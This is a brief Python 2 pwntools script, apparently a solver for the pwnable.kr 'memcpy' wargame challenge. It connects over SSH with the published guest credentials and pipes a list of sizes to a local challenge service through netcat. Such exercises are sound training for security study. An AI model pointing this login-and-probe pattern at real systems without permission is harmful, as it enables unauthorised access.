#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222
USER = "memcpy"

s = ssh(host=HOST, user=USER,
        port=PORT, password='guest')

sizes = "8 16 32 64 128 256 512 1024 2048 4096"

cmd = 'echo ' + sizes + ' | nc 0 9022'
ret = s.run_to_end(cmd)
print ret[0]
s.close()
